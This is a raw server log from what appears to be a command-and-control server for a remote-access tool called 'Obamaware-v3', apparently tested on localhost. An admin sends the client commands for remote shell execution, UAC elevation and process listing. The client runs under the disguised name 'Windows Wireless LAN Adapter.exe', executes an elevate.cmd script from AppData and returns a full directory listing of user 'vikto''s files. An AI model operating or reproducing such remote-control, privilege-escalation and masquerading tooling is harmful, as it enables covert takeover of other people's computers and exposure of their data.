+[2026-01-20 19:21:59] waiting for admin commands...
+[2026-01-20 19:22:19] iterated admin loop
+[2026-01-20 19:22:19] waiting for admin commands...
+[2026-01-20 19:22:40] iterated admin loop
+[2026-01-20 19:22:40] waiting for admin commands...
+[2026-01-20 19:23:00] iterated admin loop
+[2026-01-20 19:23:00] waiting for admin commands...
+[2026-01-20 19:23:20] iterated admin loop
+[2026-01-20 19:23:20] waiting for admin commands...
+[2026-01-20 19:23:40] iterated admin loop
+[2026-01-20 19:23:40] waiting for admin commands...
+[2026-01-20 19:24:00] iterated admin loop
+[2026-01-20 19:24:00] waiting for admin commands...
+[2026-01-20 19:24:20] iterated admin loop
+[2026-01-20 19:24:20] waiting for admin commands...
+[2026-01-20 19:24:40] iterated admin loop
+[2026-01-20 19:24:40] waiting for admin commands...
+[2026-01-20 19:25:00] iterated admin loop
+[2026-01-20 19:25:00] waiting for admin commands...
+[2026-01-20 19:25:20] iterated admin loop
+[2026-01-20 19:25:20] waiting for admin commands...
+[2026-01-20 19:25:40] iterated admin loop
+[2026-01-20 19:25:40] waiting for admin commands...
+[2026-01-20 19:25:40] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:25:40] Waiting for client Reply...
+[2026-01-20 19:25:40] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:27:16] Connected: ('127.0.0.1', 45492)
+[2026-01-20 19:27:17] ('127.0.0.1', 45492) is admin
+[2026-01-20 19:27:17] waiting for admin commands...
+[2026-01-20 19:27:19] Command from Admin: __PROC__
+[2026-01-20 19:27:19] Waiting for client Reply...
+[2026-01-20 19:27:19] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:27:24] Connected: ('127.0.0.1', 57128)
+[2026-01-20 19:27:24] Set Client to: ('127.0.0.1', 57128)
+[2026-01-20 19:27:25] Connected: ('127.0.0.1', 57134)
+[2026-01-20 19:27:25] Client disconnected: ('127.0.0.1', 59394)
+[2026-01-20 19:27:25] ('127.0.0.1', 57134) is admin
+[2026-01-20 19:27:25] waiting for admin commands...
+[2026-01-20 19:27:26] Command from Admin: __PROC__
+[2026-01-20 19:27:26] Waiting for client Reply...
+[2026-01-20 19:27:26] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:27:27] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:27:27] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:27:27] iterated admin loop
+[2026-01-20 19:27:27] waiting for admin commands...
+[2026-01-20 19:27:31] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:27:31] Waiting for client Reply...
+[2026-01-20 19:27:31] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:27:33] Reply from Client: Started elevation via UAC
+[2026-01-20 19:27:33] [send_ws] sending 27 bytes: 81 19 53 74 61 72 74 65 64 20 65 6C 65 76 61 74 69 6F 6E 20 76 69 61 20 55 41 43  ascii='�\x19Started elevation via UAC'
+[2026-01-20 19:27:33] iterated admin loop
+[2026-01-20 19:27:33] waiting for admin commands...
+[2026-01-20 19:27:53] iterated admin loop
+[2026-01-20 19:27:53] waiting for admin commands...
+[2026-01-20 19:28:04] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:28:04] Waiting for client Reply...
+[2026-01-20 19:28:04] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:28:06] Reply from Client: Started elevation via UAC
+[2026-01-20 19:28:06] [send_ws] sending 27 bytes: 81 19 53 74 61 72 74 65 64 20 65 6C 65 76 61 74 69 6F 6E 20 76 69 61 20 55 41 43  ascii='�\x19Started elevation via UAC'
+[2026-01-20 19:28:06] iterated admin loop
+[2026-01-20 19:28:06] waiting for admin commands...
+[2026-01-20 19:28:17] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:28:17] Waiting for client Reply...
+[2026-01-20 19:28:17] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:28:25] [ERROR] recv_one_frame exception: [Errno 9] Bad file descriptor
+[2026-01-20 19:28:25] [ERROR] recv_one_frame exception: [Errno 9] Bad file descriptor
+[2026-01-20 19:28:25] No reply from Client.
+[2026-01-20 19:28:25] [ERROR] recv_one_frame exception: [Errno 9] Bad file descriptor
+[2026-01-20 19:28:25] [ERROR] recv_one_frame exception: [Errno 9] Bad file descriptor
+[2026-01-20 19:28:25] No reply from Client.
+[2026-01-20 19:28:25] No reply from Client.
+[2026-01-20 19:28:25] No reply from Client.
+[2026-01-20 19:28:25] No reply from Client.
+[2026-01-20 19:28:25] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:28:25] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:28:25] iterated admin loop
+[2026-01-20 19:28:25] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:28:25] Client disconnected: ('127.0.0.1', 33928)
+[2026-01-20 19:28:25] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:28:25] iterated admin loop
+[2026-01-20 19:28:25] Client disconnected: ('127.0.0.1', 45042)
+[2026-01-20 19:28:25] iterated admin loop
+[2026-01-20 19:28:25] Client disconnected: ('127.0.0.1', 45492)
+[2026-01-20 19:28:25] iterated admin loop
+[2026-01-20 19:28:25] Client disconnected: ('127.0.0.1', 59390)
+[2026-01-20 19:28:25] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:28:25] iterated admin loop
+[2026-01-20 19:28:25] waiting for admin commands...
+[2026-01-20 19:28:25] admin socket dead.
+[2026-01-20 19:28:25] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:28:25] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:28:25] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 19:28:25] iterated admin loop
+[2026-01-20 19:28:25] Client disconnected: ('127.0.0.1', 57134)
+[2026-01-20 19:28:25] Client disconnected: ('127.0.0.1', 57128)
+[2026-01-20 19:28:52] Connected: ('127.0.0.1', 56682)
+[2026-01-20 19:28:52] ('127.0.0.1', 56682) is admin
+[2026-01-20 19:28:54] waiting for admin commands...
+[2026-01-20 19:28:54] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 19:28:54] Waiting for client Reply...
+[2026-01-20 19:28:54] No Client connected.
+[2026-01-20 19:28:54] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:28:54] iterated admin loop
+[2026-01-20 19:28:55] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:28:55] waiting for admin commands...
+[2026-01-20 19:28:56] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 19:28:56] Waiting for client Reply...
+[2026-01-20 19:28:56] No Client connected.
+[2026-01-20 19:28:56] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:28:56] iterated admin loop
+[2026-01-20 19:28:57] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:28:57] waiting for admin commands...
+[2026-01-20 19:28:58] Connected: ('127.0.0.1', 56690)
+[2026-01-20 19:28:58] Set Client to: ('127.0.0.1', 56690)
+[2026-01-20 19:28:58] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 19:28:58] Waiting for client Reply...
+[2026-01-20 19:28:58] No Client connected.
+[2026-01-20 19:28:58] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:28:58] iterated admin loop
+[2026-01-20 19:28:58] waiting for admin commands...
+[2026-01-20 19:28:59] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 19:28:59] Waiting for client Reply...
+[2026-01-20 19:28:59] [send_ws] sending 25 bytes: 81 17 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 65 63 68 6F 20 68 69  ascii='�\x17__EXECUTE__ ### echo hi'
+[2026-01-20 19:28:59] Reply from Client: C:\Windows\System32
+hi
+[2026-01-20 19:28:59] [send_ws] sending 25 bytes: 81 17 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 68 69  ascii='�\x17C:\\Windows\\System32\r\nhi'
+[2026-01-20 19:28:59] iterated admin loop
+[2026-01-20 19:28:59] waiting for admin commands...
+[2026-01-20 19:29:02] Command from Admin: __PROC__
+[2026-01-20 19:29:02] Waiting for client Reply...
+[2026-01-20 19:29:02] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:29:02] Reply from Client: Windows Wireless LAN Adapter.exe, elevated
+[2026-01-20 19:29:02] [send_ws] sending 44 bytes: 81 2A 57 69 6E 64 6F 77 73 20 57 69 72 65 6C 65 73 73 20 4C 41 4E 20 41 64 61 70 74 65 72 2E 65 78 65 2C 20 65 6C 65 76 61 74 65 64  ascii='�*Windows Wireless LAN Adapter.exe, elevated'
+[2026-01-20 19:29:02] iterated admin loop
+[2026-01-20 19:29:02] waiting for admin commands...
+[2026-01-20 19:29:22] iterated admin loop
+[2026-01-20 19:29:22] waiting for admin commands...
+[2026-01-20 19:29:27] Command from Admin: __EXECUTE__ ### %LOCALAPPDATA%/Obamaware-v3/elevate.cmd
+[2026-01-20 19:29:27] Waiting for client Reply...
+[2026-01-20 19:29:27] [send_ws] sending 57 bytes: 81 37 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 2F 4F 62 61 6D 61 77 61 72 65 2D 76 33 2F 65 6C 65 76 61 74 65 2E 63 6D 64  ascii='�7__EXECUTE__ ### %LOCALAPPDATA%/Obamaware-v3/elevate.cmd'
+[2026-01-20 19:29:27] Reply from Client: C:\Windows\System32
+23 File(s) copied
+[2026-01-20 19:29:27] [send_ws] sending 40 bytes: 81 26 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 32 33 20 46 69 6C 65 28 73 29 20 63 6F 70 69 65 64  ascii='�&C:\\Windows\\System32\r\n23 File(s) copied'
+[2026-01-20 19:29:27] iterated admin loop
+[2026-01-20 19:29:27] waiting for admin commands...
+[2026-01-20 19:29:47] iterated admin loop
+[2026-01-20 19:29:47] waiting for admin commands...
+[2026-01-20 19:30:03] Command from Admin: __EXECUTE__ ### type %LOCALAPPDATA%/Obamaware-v3/elevate.cmd
+[2026-01-20 19:30:03] Waiting for client Reply...
+[2026-01-20 19:30:03] [send_ws] sending 62 bytes: 81 3C 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 74 79 70 65 20 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 2F 4F 62 61 6D 61 77 61 72 65 2D 76 33 2F 65 6C 65 76 61 74 65 2E 63 6D 64  ascii='�<__EXECUTE__ ### type %LOCALAPPDATA%/Obamaware-v3/elevate.cmd'
+[2026-01-20 19:30:04] Reply from Client: C:\Windows\System32
+The syntax of the command is incorrect.
+[2026-01-20 19:30:04] [send_ws] sending 62 bytes: 81 3C 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 54 68 65 20 73 79 6E 74 61 78 20 6F 66 20 74 68 65 20 63 6F 6D 6D 61 6E 64 20 69 73 20 69 6E 63 6F 72 72 65 63 74 2E  ascii='�<C:\\Windows\\System32\r\nThe syntax of the command is incorrect.'
+[2026-01-20 19:30:04] iterated admin loop
+[2026-01-20 19:30:04] waiting for admin commands...
+[2026-01-20 19:30:08] Command from Admin: __EXECUTE__ ### type "%LOCALAPPDATA%/Obamaware-v3/elevate.cmd"
+[2026-01-20 19:30:08] Waiting for client Reply...
+[2026-01-20 19:30:08] [send_ws] sending 64 bytes: 81 3E 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 74 79 70 65 20 22 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 2F 4F 62 61 6D 61 77 61 72 65 2D 76 33 2F 65 6C 65 76 61 74 65 2E 63 6D 64 22  ascii='�>__EXECUTE__ ### type "%LOCALAPPDATA%/Obamaware-v3/elevate.cmd"'
+[2026-01-20 19:30:08] Reply from Client: C:\Windows\System32
+The system cannot find the file specified.
+[2026-01-20 19:30:08] [send_ws] sending 65 bytes: 81 3F 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 54 68 65 20 73 79 73 74 65 6D 20 63 61 6E 6E 6F 74 20 66 69 6E 64 20 74 68 65 20 66 69 6C 65 20 73 70 65 63 69 66 69 65 64 ...  ascii='�?C:\\Windows\\System32\r\nThe system cannot find the file specified.'
+[2026-01-20 19:30:08] iterated admin loop
+[2026-01-20 19:30:08] waiting for admin commands...
+[2026-01-20 19:30:28] iterated admin loop
+[2026-01-20 19:30:28] waiting for admin commands...
+[2026-01-20 19:30:35] Command from Admin: __EXECUTE__ ### dir "%LOCALAPPDATA%/Obamaware-v3/elevate.cmd"
+[2026-01-20 19:30:35] Waiting for client Reply...
+[2026-01-20 19:30:35] [send_ws] sending 63 bytes: 81 3D 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 64 69 72 20 22 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 2F 4F 62 61 6D 61 77 61 72 65 2D 76 33 2F 65 6C 65 76 61 74 65 2E 63 6D 64 22  ascii='�=__EXECUTE__ ### dir "%LOCALAPPDATA%/Obamaware-v3/elevate.cmd"'
+[2026-01-20 19:30:35] Reply from Client: C:\Windows\System32
+ Volume in drive C is OS
+ Volume Serial Number is C67D-D508
+
+ Directory of C:\Users\vikto\AppData\Local\Obamaware-v3
+
+File Not Found
+[2026-01-20 19:30:35] [send_ws] sending 162 bytes: 81 7E 00 9E 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 20 56 6F 6C 75 6D 65 20 69 6E 20 64 72 69 76 65 20 43 20 69 73 20 4F 53 0D 0A 20 56 6F 6C 75 6D 65 20 53 65 72 69 61 ...  ascii='�~\x00�C:\\Windows\\System32\r\n Volume in drive C is OS\r\n Volume Serial Number is C67D-D508\r\n\r\n Directory of C:\\Users\\vikto\\AppData\\Local\\Obamaware-v3\r\n\r\nFile Not Found'
+[2026-01-20 19:30:35] iterated admin loop
+[2026-01-20 19:30:35] waiting for admin commands...
+[2026-01-20 19:30:53] Command from Admin: __EXECUTE__ ### dir %LOCALAPPDATA%
+[2026-01-20 19:30:53] Waiting for client Reply...
+[2026-01-20 19:30:53] [send_ws] sending 36 bytes: 81 22 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 64 69 72 20 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25  ascii='�"__EXECUTE__ ### dir %LOCALAPPDATA%'
+[2026-01-20 19:30:53] Reply from Client: C:\Windows\System32
+ Volume in drive C is OS
+ Volume Serial Number is C67D-D508
+
+ Directory of C:\Users\vikto\AppData\Local
+
+01/20/2026  03:23 PM    <DIR>          .
+01/20/2026  11:14 AM    <DIR>          .IdentityService
+08/19/2025  12:33 PM    <DIR>          arduino
+08/19/2025  08:26 AM    <DIR>          arduino-ide-updater
+08/19/2025  08:28 AM    <DIR>          Arduino15
+11/07/2025  09:33 AM    <DIR>          Athena
+02/27/2024  05:02 PM    <DIR>          Backup
+01/06/2026  04:44 PM    <DIR>          BattlEye
+10/01/2025  02:39 PM    <DIR>          bin
+12/24/2025  02:40 PM    <DIR>          bitbrowser-updater
+07/31/2024  04:13 PM    <DIR>          Bohemia_Interactive_a.s
+04/12/2024  04:14 PM    <DIR>          Buff
+08/16/2025  01:47 PM    <DIR>          cache
+08/19/2025  06:23 PM    <DIR>          ccache
+02/22/2024  01:02 AM    <DIR>          CEF
+11/05/2025  07:25 PM    <DIR>          Chromium
+08/19/2025  11:43 AM    <DIR>          CMakeTools
+08/16/2025  02:46 PM    <DIR>          Comms
+03/18/2024  05:11 PM    <DIR>          ConnectedDevicesPlatform
+01/20/2026  03:23 PM    <DIR>          CrashDumps
+12/03/2024  06:09 PM    <DIR>          CrashReportClient
+01/17/2026  11:41 AM    <DIR>          D3DSCache
+04/12/2025  04:12 PM    <DIR>          DayZ Launcher
+06/21/2024  01:52 PM    <DIR>          DBG
+01/20/2026  06:10 PM    <DIR>          Discord
+10/23/2025  12:31 PM    <DIR>          Embody
+01/06/2026  04:45 PM    <DIR>          enlisted
+02/22/2024  01:00 AM    <DIR>          Epic Games
+03/18/2024  05:25 PM    <DIR>          FortniteGame
+10/08/2025  07:34 AM    <DIR>          github-copilot
+05/01/2024  02:24 PM    <DIR>          GitHubDesktop
+01/02/2026  08:55 PM    <DIR>          Google
+11/27/2025  08:54 PM    <DIR>          HalfSwordUE5
+03/09/2024  05:26 PM    <DIR>          ImageMagick
+03/18/2024  05:10 PM    <DIR>          INetHistory
+12/26/2025  03:06 PM    <DIR>          install4j
+03/03/2024  11:36 AM    <DIR>          Jedi
+08/19/2025  01:58 PM    <DIR>          JetBrains
+03/19/2024  04:29 PM    <DIR>          launcher-updater
+07/29/2024  11:27 AM    <DIR>          LogMeIn
+01/20/2026  05:06 PM    <DIR>          LogMeIn Hamachi
+11/01/2024  12:57 PM    <DIR>          lunarclient-updater
+02/22/2024  01:37 AM    <DIR>          main.kts.compiled.cache
+03/21/2025  10:31 PM    <DIR>          mbed-studio-updater
+03/21/2025  09:32 PM    <DIR>          mbedls
+01/12/2026  08:50 AM    <DIR>          Microsoft
+09/07/2025  04:57 PM    <DIR>          MinecraftInstaller
+01/12/2026  07:50 PM    <DIR>          Modrinth App
+01/12/2026  07:51 PM    <DIR>          ModrinthApp
+01/02/2026  08:47 PM    <DIR>          Mozilla
+02/24/2024  05:43 PM    <DIR>          ngrok
+01/02/2026  08:59 PM    <DIR>          npm-cache
+03/21/2025  06:00 PM    <DIR>          nrfconnect-updater
+10/04/2025  03:59 PM    <DIR>          NuGet
+07/02/2025  03:15 PM    <DIR>          NVIDIA
+12/03/2024  06:10 PM    <DIR>          NVIDIA Corporation
+02/22/2024  01:47 AM    <DIR>          OneDrive
+09/29/2025  08:57 PM    <DIR>          Package Cache
+02/22/2024  08:23 PM    <DIR>          PackageManagement
+01/19/2026  09:47 PM    <DIR>          Packages
+03/05/2024  05:36 PM    <DIR>          pip
+01/02/2026  08:41 PM    <DIR>          PlaceholderTileLogoFolder
+04/02/2025  12:44 PM           153,331 processed_stats_advanced_competitive.json
+04/12/2025  02:17 PM           151,005 processed_stats_beginner_competitive.json
+04/02/2025  12:44 PM           153,529 processed_stats_expert_competitive.json
+04/14/2025  12:10 PM           152,365 processed_stats_intermediate_competitive.json
+12/26/2025  03:06 PM    <DIR>          Programs
+02/22/2024  01:10 AM    <DIR>          Publishers
+09/29/2025  09:00 PM    <DIR>          pyinstaller
+03/03/2024  01:38 PM    <DIR>          pypa
+06/10/2025  05:31 PM             7,606 Resmon.ResmonCfg
+01/10/2026  08:25 PM    <DIR>          Riot Games
+02/02/2025  05:54 PM    <DIR>          Rufus
+08/18/2024  11:50 AM    <DIR>          speech
+11/18/2025  04:37 PM    <DIR>          Steam
+01/20/2026  07:29 PM    <DIR>          Temp
+01/07/2026  05:25 PM    <DIR>          thonny-vikto
+06/26/2024  02:40 PM    <DIR>          unityhub-updater
+01/05/2026  02:25 PM    <DIR>          UnrealEngine
+12/03/2024  04:10 PM    <DIR>          UnrealEngineLauncher
+01/05/2026  02:25 PM    <DIR>          VALORANT
+10/21/2025  01:30 PM    <DIR>          vcpkg
+02/22/2024  02:30 AM    <DIR>          VirtualStore
+06/06/2024  05:39 PM    <DIR>          Vitalwerks
+01/04/2026  10:44 PM    <DIR>          wsl
+               5 File(s)        617,836 bytes
+              80 Dir(s)  25,346,654,208 bytes free
+[2026-01-20 19:30:53] [send_ws] sending 4722 bytes: 81 7E 12 6E 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 20 56 6F 6C 75 6D 65 20 69 6E 20 64 72 69 76 65 20 43 20 69 73 20 4F 53 0D 0A 20 56 6F 6C 75 6D 65 20 53 65 72 69 61 ...  ascii='�~\x12nC:\\Windows\\System32\r\n Volume in drive C is OS\r\n Volume Serial Number is C67D-D508\r\n\r\n Directory of C:\\Users\\vikto\\AppData\\Local\r\n\r\n01/20/2026  03:23 PM    <DIR>          .\r\n01/20/2026  11:14 AM    <DIR>          .IdentityService\r\n08/19/2025  12:33 PM    <DIR>          arduino\r\n08/19/2025  08:26 AM    <DIR>          arduino-ide-updater\r\n08/19/2025  08:28 AM    <DIR>          Arduino15\r\n11/07/2025  09:33 AM    <DIR>          Athena\r\n02/27/2024  05:02 PM    <DIR>          Backup\r\n01/06/2026  04:44 PM    <DIR>          BattlEye\r\n10/01/2025  02:39 PM    <DIR>          bin\r\n12/24/2025  02:40 PM    <DIR>          bitbrowser-updater\r\n07/31/2024  04:13 PM    <DIR>          Bohemia_Interactive_a.s\r\n04/12/2024  04:14 PM    <DIR>          Buff\r\n08/16/2025  01:47 PM    <DIR>          cache\r\n08/19/2025  06:23 PM    <DIR>          ccache\r\n02/22/2024  01:02 AM    <DIR>          CEF\r\n11/05/2025  07:25 PM    <DIR>          Chromium\r\n08/19/2025  11:43 AM    <DIR>          CMakeTools\r\n08/16/2025  02:46 PM    <DIR>          Comms\r\n03/18/2024  05:11 PM    <DIR>          ConnectedDevicesPlatform\r\n01/20/2026  03:23 PM    <DIR>          CrashDumps\r\n12/03/2024  06:09 PM    <DIR>          CrashReportClient\r\n01/17/2026  11:41 AM    <DIR>          D3DSCache\r\n04/12/2025  04:12 PM    <DIR>          DayZ Launcher\r\n06/21/2024  01:52 PM    <DIR>          DBG\r\n01/20/2026  06:10 PM    <DIR>          Discord\r\n10/23/2025  12:31 PM    <DIR>          Embody\r\n01/06/2026  04:45 PM    <DIR>          enlisted\r\n02/22/2024  01:00 AM    <DIR>          Epic Games\r\n03/18/2024  05:25 PM    <DIR>          FortniteGame\r\n10/08/2025  07:34 AM    <DIR>          github-copilot\r\n05/01/2024  02:24 PM    <DIR>          GitHubDesktop\r\n01/02/2026  08:55 PM    <DIR>          Google\r\n11/27/2025  08:54 PM    <DIR>          HalfSwordUE5\r\n03/09/2024  05:26 PM    <DIR>          ImageMagick\r\n03/18/2024  05:10 PM    <DIR>          INetHistory\r\n12/26/2025  03:06 PM    <DIR>          install4j\r\n03/03/2024  11:36 AM    <DIR>          Jedi\r\n08/19/2025  01:58 PM    <DIR>          JetBrains\r\n03/19/2024  04:29 PM    <DIR>          launcher-updater\r\n07/29/2024  11:27 AM    <DIR>          LogMeIn\r\n01/20/2026  05:06 PM    <DIR>          LogMeIn Hamachi\r\n11/01/2024  12:57 PM    <DIR>          lunarclient-updater\r\n02/22/2024  01:37 AM    <DIR>          main.kts.compiled.cache\r\n03/21/2025  10:31 PM    <DIR>          mbed-studio-updater\r\n03/21/2025  09:32 PM    <DIR>          mbedls\r\n01/12/2026  08:50 AM    <DIR>          Microsoft\r\n09/07/2025  04:57 PM    <DIR>          MinecraftInstaller\r\n01/12/2026  07:50 PM    <DIR>          Modrinth App\r\n01/12/2026  07:51 PM    <DIR>          ModrinthApp\r\n01/02/2026  08:47 PM    <DIR>          Mozilla\r\n02/24/2024  05:43 PM    <DIR>          ngrok\r\n01/02/2026  08:59 PM    <DIR>          npm-cache\r\n03/21/2025  06:00 PM    <DIR>          nrfconnect-updater\r\n10/04/2025  03:59 PM    <DIR>          NuGet\r\n07/02/2025  03:15 PM    <DIR>          NVIDIA\r\n12/03/2024  06:10 PM    <DIR>          NVIDIA Corporation\r\n02/22/2024  01:47 AM    <DIR>          OneDrive\r\n09/29/2025  08:57 PM    <DIR>          Package Cache\r\n02/22/2024  08:23 PM    <DIR>          PackageManagement\r\n01/19/2026  09:47 PM    <DIR>          Packages\r\n03/05/2024  05:36 PM    <DIR>          pip\r\n01/02/2026  08:41 PM    <DIR>          PlaceholderTileLogoFolder\r\n04/02/2025  12:44 PM           153,331 processed_stats_advanced_competitive.json\r\n04/12/2025  02:17 PM           151,005 processed_stats_beginner_competitive.json\r\n04/02/2025  12:44 PM           153,529 processed_stats_expert_competitive.json\r\n04/14/2025  12:10 PM           152,365 processed_stats_intermediate_competitive.json\r\n12/26/2025  03:06 PM    <DIR>          Programs\r\n02/22/2024  01:10 AM    <DIR>          Publishers\r\n09/29/2025  09:00 PM    <DIR>          pyinstaller\r\n03/03/2024  01:38 PM    <DIR>          pypa\r\n06/10/2025  05:31 PM             7,606 Resmon.ResmonCfg\r\n01/10/2026  08:25 PM    <DIR>          Riot Games\r\n02/02/2025  05:54 PM    <DIR>          Rufus\r\n08/18/2024  11:50 AM    <DIR>          speech\r\n11/18/2025  04:37 PM    <DIR>          Steam\r\n01/20/2026  07:29 PM    <DIR>          Temp\r\n01/07/2026  05:25 PM    <DIR>          thonny-vikto\r\n06/26/2024  02:40 PM    <DIR>          unityhub-updater\r\n01/05/2026  02:25 PM    <DIR>          UnrealEngine\r\n12/03/2024  04:10 PM    <DIR>          UnrealEngineLauncher\r\n01/05/2026  02:25 PM    <DIR>          VALORANT\r\n10/21/2025  01:30 PM    <DIR>          vcpkg\r\n02/22/2024  02:30 AM    <DIR>          VirtualStore\r\n06/06/2024  05:39 PM    <DIR>          Vitalwerks\r\n01/04/2026  10:44 PM    <DIR>          wsl\r\n               5 File(s)        617,836 bytes\r\n              80 Dir(s)  25,346,654,208 bytes free'
+[2026-01-20 19:30:53] iterated admin loop
+[2026-01-20 19:30:53] waiting for admin commands...
+[2026-01-20 19:30:57] Command from Admin: __CD__ ### cd %LOCALAPPDATA%
+[2026-01-20 19:30:57] Waiting for client Reply...
+[2026-01-20 19:30:57] [send_ws] sending 30 bytes: 81 1C 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64 20 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25  ascii='�\x1c__CD__ ### cd %LOCALAPPDATA%'
+[2026-01-20 19:30:58] Reply from Client: The filename, directory name, or volume label syntax is incorrect.
+C:\Windows\System32
+[2026-01-20 19:30:58] [send_ws] sending 89 bytes: 81 57 54 68 65 20 66 69 6C 65 6E 61 6D 65 2C 20 64 69 72 65 63 74 6F 72 79 20 6E 61 6D 65 2C 20 6F 72 20 76 6F 6C 75 6D 65 20 6C 61 62 65 6C 20 73 79 6E 74 61 78 20 69 73 20 69 6E 63 6F 72 72 ...  ascii='�WThe filename, directory name, or volume label syntax is incorrect.\r\nC:\\Windows\\System32'
+[2026-01-20 19:30:58] iterated admin loop
+[2026-01-20 19:30:58] waiting for admin commands...
+[2026-01-20 19:31:04] Command from Admin: __CD__ ### cd "%LOCALAPPDATA%"
+[2026-01-20 19:31:04] Waiting for client Reply...
+[2026-01-20 19:31:04] [send_ws] sending 32 bytes: 81 1E 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64 20 22 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 22  ascii='�\x1e__CD__ ### cd "%LOCALAPPDATA%"'
